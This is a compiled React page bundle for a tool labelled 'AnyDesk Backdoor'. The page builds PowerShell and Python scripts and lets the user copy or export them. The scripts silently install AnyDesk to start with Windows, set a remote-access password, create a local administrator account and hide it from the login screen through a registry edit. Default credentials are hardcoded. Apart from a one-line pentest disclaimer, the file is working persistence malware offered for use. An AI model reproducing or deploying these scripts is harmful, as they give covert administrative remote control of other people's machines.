module.exports=[22161,a=>{"use strict";var b=a.i(1973),c=a.i(87202),d=a.i(93097),e=a.i(39584),f=a.i(41804),g=a.i(26716),h=a.i(79103),i=a.i(70087),j=a.i(85902),k=a.i(21202),l=a.i(8828),m=a.i(19463),n=a.i(31085),o=a.i(69457),p=a.i(27895);function q(){let[a,q]=(0,p.useState)(!1),[r,s]=(0,p.useState)(0),[t,u]=(0,p.useState)(null),[v,w]=(0,p.useState)("powershell"),[x,y]=(0,p.useState)({installPath:"C:\\ProgramData\\AnyDesk",anydeskUrl:"http://download.anydesk.com/AnyDesk.exe",password:"J9kzQ2Y0qO",adminUsername:"oldadministrator",adminPassword:"jsbehsid#Zyw4E3"}),z=async()=>{q(!0),s(0),u(null);try{for(let{progress:a}of[{step:"Validating configuration...",progress:10},{step:"Downloading AnyDesk...",progress:25},{step:"Installing AnyDesk...",progress:40},{step:"Setting password...",progress:55},{step:"Creating admin user...",progress:70},{step:"Configuring permissions...",progress:85},{step:"Retrieving AnyDesk ID...",progress:95},{step:"Finalizing installation...",progress:100}])s(a),await new Promise(a=>setTimeout(a,800));u({success:!0,message:"AnyDesk backdoor installed successfully",anydeskId:"123 456 789"})}catch(a){console.error("Execution failed:",a),u({success:!1,message:"Installation failed",error:a instanceof Error?a.message:"Unknown error occurred"})}finally{q(!1),s(0)}},A=()=>`function Install-AnyDesk {
    param (
        [string]$InstallPath = "${x.installPath}",
        [string]$AnyDeskUrl = "${x.anydeskUrl}",
        [string]$Password = "${x.password}",
        [string]$AdminUsername = "${x.adminUsername}",
        [string]$AdminPassword = "${x.adminPassword}"
    )

    try {
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {
            New-Item -Path $InstallPath -ItemType Directory
        }

        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe")
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait
        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
        Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait
        
        Write-Host "Installation completed successfully."
    }
    catch {
        Write-Host "Error: $_"
        Write-Host "Installation failed."
    }
}

Install-AnyDesk`,B=()=>`import os
import subprocess
import requests
import ctypes
import sys
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_anydesk(install_path="${x.installPath.replace("\\","\\\\")}",
                   anydesk_url="${x.anydeskUrl}",
                   password="${x.password}",
                   admin_username="${x.adminUsername}",
                   admin_password="${x.adminPassword}"):
    try:
        if is_admin():
            if not os.path.exists(install_path):
                os.makedirs(install_path)

            anydesk_exe_path = os.path.join(install_path, "AnyDesk.exe")
            with open(anydesk_exe_path, 'wb') as exe_file:
                response = requests.get(anydesk_url)
                exe_file.write(response.content)

            install_command = f'"{anydesk_exe_path}" --install "{install_path}" --start-with-win --silent'
            subprocess.run(install_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            set_password_command = f'"{anydesk_exe_path}" --set-password={password}'
            subprocess.run(set_password_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            subprocess.run(['net', 'user', admin_username, admin_password, '/add'], check=True)
            subprocess.run(['net', 'localgroup', 'Administrators', admin_username, '/add'], check=True)

            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\Userlist')
            winreg.SetValueEx(key, admin_username, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)

            get_id_command = f'"{anydesk_exe_path}" --get-id'
            subprocess.run(get_id_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("Installation completed successfully.")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    except Exception as e:
        print(f"Error: {e}")
        print("Installation failed.")

install_anydesk()`;return(0,b.jsxs)("div",{className:"space-y-6",children:[(0,b.jsxs)(e.Card,{children:[(0,b.jsxs)(e.CardHeader,{children:[(0,b.jsxs)(e.CardTitle,{className:"flex items-center space-x-2",children:[(0,b.jsx)(k.Monitor,{className:"h-5 w-5 text-blue-400"}),(0,b.jsx)("span",{children:"AnyDesk Backdoor"})]}),(0,b.jsx)(e.CardDescription,{children:"Remote desktop backdoor tool for penetration testing and security assessment"})]}),(0,b.jsx)(e.CardContent,{children:(0,b.jsxs)("div",{className:"flex items-center space-x-2",children:[(0,b.jsx)(c.Badge,{variant:"outline",className:"border-blue-600 text-blue-400",children:"Windows Only"}),(0,b.jsx)(c.Badge,{variant:"outline",className:"border-red-600 text-red-400",children:"Admin Required"}),(0,b.jsx)(c.Badge,{variant:"outline",className:"border-purple-600 text-purple-400",children:"Stealth Mode"})]})})]}),(0,b.jsxs)(e.Card,{children:[(0,b.jsx)(e.CardHeader,{children:(0,b.jsxs)(e.CardTitle,{className:"flex items-center space-x-2",children:[(0,b.jsx)(m.Settings,{className:"h-5 w-5"}),(0,b.jsx)("span",{children:"Configuration"})]})}),(0,b.jsx)(e.CardContent,{className:"space-y-4",children:(0,b.jsxs)("div",{className:"grid gap-4 md:grid-cols-2",children:[(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"script-type",className:"text-sm font-medium",children:"Script Type"}),(0,b.jsxs)("select",{id:"script-type",value:v,onChange:a=>w(a.target.value),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Select script type for AnyDesk backdoor installation",children:[(0,b.jsx)("option",{value:"powershell",children:"PowerShell"}),(0,b.jsx)("option",{value:"python",children:"Python"})]})]}),(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"install-path",className:"text-sm font-medium",children:"Installation Path"}),(0,b.jsx)("input",{id:"install-path",type:"text",value:x.installPath,onChange:a=>y({...x,installPath:a.target.value}),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Installation path for AnyDesk backdoor",placeholder:"C:\\ProgramData\\AnyDesk"})]}),(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"anydesk-url",className:"text-sm font-medium",children:"AnyDesk URL"}),(0,b.jsx)("input",{id:"anydesk-url",type:"text",value:x.anydeskUrl,onChange:a=>y({...x,anydeskUrl:a.target.value}),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Download URL for AnyDesk executable",placeholder:"http://download.anydesk.com/AnyDesk.exe"})]}),(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"anydesk-password",className:"text-sm font-medium",children:"AnyDesk Password"}),(0,b.jsx)("input",{id:"anydesk-password",type:"password",value:x.password,onChange:a=>y({...x,password:a.target.value}),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Password for AnyDesk remote connection",placeholder:"Enter connection password"})]}),(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"admin-username",className:"text-sm font-medium",children:"Admin Username"}),(0,b.jsx)("input",{id:"admin-username",type:"text",value:x.adminUsername,onChange:a=>y({...x,adminUsername:a.target.value}),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Username for hidden administrative account",placeholder:"Enter admin username"})]}),(0,b.jsxs)("div",{className:"space-y-2",children:[(0,b.jsx)("label",{htmlFor:"admin-password",className:"text-sm font-medium",children:"Admin Password"}),(0,b.jsx)("input",{id:"admin-password",type:"password",value:x.adminPassword,onChange:a=>y({...x,adminPassword:a.target.value}),className:"w-full px-3 py-2 border border-input rounded-md bg-background",disabled:a,"aria-label":"Password for hidden administrative account",placeholder:"Enter admin password"})]})]})})]}),(0,b.jsxs)(e.Card,{children:[(0,b.jsx)(e.CardHeader,{children:(0,b.jsx)(e.CardTitle,{children:"Execution Controls"})}),(0,b.jsxs)(e.CardContent,{children:[(0,b.jsxs)("div",{className:"flex items-center space-x-2",children:[(0,b.jsxs)(d.Button,{onClick:z,disabled:a,className:"bg-blue-600 hover:bg-blue-700","aria-label":"Install AnyDesk backdoor with current configuration",children:[(0,b.jsx)(l.Play,{className:"mr-2 h-4 w-4"}),a?"Installing...":"Install Backdoor"]}),(0,b.jsxs)(d.Button,{onClick:()=>{q(!1),s(0)},disabled:!a,variant:"destructive","aria-label":"Stop the current AnyDesk installation process",children:[(0,b.jsx)(n.Square,{className:"mr-2 h-4 w-4"}),"Stop"]}),(0,b.jsx)(d.Button,{onClick:()=>{let a="powershell"===v?A():B();navigator.clipboard.writeText(a)},disabled:a,variant:"outline","aria-label":"Copy generated script to clipboard",children:"Copy Script"}),(0,b.jsxs)(d.Button,{onClick:()=>{let a="powershell"===v?A():B(),b="powershell"===v?"anydesk-backdoor.ps1":"anydesk-backdoor.py",c=new Blob([a],{type:"text/plain"}),d=URL.createObjectURL(c),e=document.createElement("a");e.href=d,e.download=b,e.click(),URL.revokeObjectURL(d)},disabled:a,variant:"outline","aria-label":"Export generated script as a file",children:[(0,b.jsx)(j.Download,{className:"mr-2 h-4 w-4"}),"Export Script"]})]}),a&&(0,b.jsxs)("div",{className:"mt-4 space-y-2",children:[(0,b.jsxs)("div",{className:"flex justify-between text-sm",children:[(0,b.jsx)("span",{children:"Installation Progress"}),(0,b.jsxs)("span",{children:[r,"%"]})]}),(0,b.jsx)(f.Progress,{value:r,className:"h-2"})]})]})]}),t&&(0,b.jsxs)(e.Card,{children:[(0,b.jsx)(e.CardHeader,{children:(0,b.jsxs)(e.CardTitle,{className:"flex items-center justify-between",children:[(0,b.jsxs)("span",{className:"flex items-center space-x-2",children:[t.success?(0,b.jsx)(i.CheckCircle,{className:"h-5 w-5 text-green-400"}):(0,b.jsx)(o.XCircle,{className:"h-5 w-5 text-red-400"}),(0,b.jsx)("span",{children:"Installation Results"})]}),(0,b.jsx)(c.Badge,{variant:t.success?"success":"destructive",children:t.success?"Success":"Failed"})]})}),(0,b.jsx)(e.CardContent,{children:t.success?(0,b.jsxs)("div",{className:"space-y-4",children:[(0,b.jsx)("div",{className:"p-4 bg-green-50 dark:bg-green-950 rounded-lg",children:(0,b.jsx)("p",{className:"text-sm font-medium text-green-800 dark:text-green-200",children:t.message})}),t.anydeskId&&(0,b.jsxs)("div",{className:"grid gap-4 md:grid-cols-2 text-sm",children:[(0,b.jsxs)("div",{children:[(0,b.jsx)("span",{className:"text-muted-foreground",children:"AnyDesk ID:"}),(0,b.jsx)("span",{className:"ml-2 font-mono font-medium text-blue-400",children:t.anydeskId})]}),(0,b.jsxs)("div",{children:[(0,b.jsx)("span",{className:"text-muted-foreground",children:"Connection Password:"}),(0,b.jsx)("span",{className:"ml-2 font-mono font-medium text-yellow-400",children:x.password})]}),(0,b.jsxs)("div",{children:[(0,b.jsx)("span",{className:"text-muted-foreground",children:"Admin Username:"}),(0,b.jsx)("span",{className:"ml-2 font-medium",children:x.adminUsername})]}),(0,b.jsxs)("div",{children:[(0,b.jsx)("span",{className:"text-muted-foreground",children:"Admin Password:"}),(0,b.jsx)("span",{className:"ml-2 font-mono font-medium text-red-400",children:x.adminPassword})]})]}),(0,b.jsx)("div",{className:"p-4 bg-yellow-50 dark:bg-yellow-950 rounded-lg",children:(0,b.jsxs)("p",{className:"text-xs text-yellow-800 dark:text-yellow-200",children:[(0,b.jsx)("strong",{children:"Security Note:"})," This tool creates a hidden administrative user and installs AnyDesk for remote access. Use only for authorized penetration testing and security assessment purposes."]})})]}):(0,b.jsxs)("div",{className:"flex items-center space-x-2 text-destructive",children:[(0,b.jsx)(h.AlertTriangle,{className:"h-5 w-5"}),(0,b.jsx)("span",{children:t.error||t.message})]})})]}),(0,b.jsxs)(e.Card,{children:[(0,b.jsxs)(e.CardHeader,{children:[(0,b.jsxs)(e.CardTitle,{children:["Generated Script (","powershell"===v?"PowerShell":"Python",")"]}),(0,b.jsx)(e.CardDescription,{children:"The script that will be executed on the target system"})]}),(0,b.jsx)(e.CardContent,{children:(0,b.jsx)("div",{className:"bg-muted rounded-lg p-4",children:(0,b.jsx)("pre",{className:"text-xs font-mono whitespace-pre-wrap break-all max-h-96 overflow-y-auto",children:"powershell"===v?A():B()})})})]}),(0,b.jsxs)(e.Card,{children:[(0,b.jsxs)(e.CardHeader,{children:[(0,b.jsx)(e.CardTitle,{children:"Execution Terminal"}),(0,b.jsx)(e.CardDescription,{children:"Real-time execution output and debugging information"})]}),(0,b.jsx)(e.CardContent,{children:(0,b.jsx)(g.Terminal,{readOnly:!0})})]})]})}var r=a.i(74900);function s(){return(0,b.jsx)(r.ProtectedRoute,{requiredPermission:"tools.anydesk",children:(0,b.jsxs)("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900",children:[(0,b.jsx)("header",{className:"bg-slate-800/50 backdrop-blur-sm border-b border-slate-700",children:(0,b.jsx)("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",children:(0,b.jsx)("div",{className:"flex items-center h-16",children:(0,b.jsxs)("div",{className:"flex items-center",children:[(0,b.jsx)("div",{className:"p-2 bg-gradient-to-br from-purple-600 to-blue-600 rounded-lg",children:(0,b.jsx)("svg",{className:"h-6 w-6 text-white",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,b.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),(0,b.jsxs)("div",{className:"ml-4",children:[(0,b.jsx)("h1",{className:"text-xl font-bold text-white",children:"AnyDesk Backdoor"}),(0,b.jsx)("p",{className:"text-sm text-gray-300",children:"Remote Desktop Access Tool"})]})]})})})}),(0,b.jsx)("main",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",children:(0,b.jsx)(q,{})})]})})}a.s(["default",()=>s],22161)}];

//# sourceMappingURL=3d860_Projet%20Web_Alpha%20AI_frontend_app_tools_anydesk-backdoor_page_tsx_058edf93._.js.map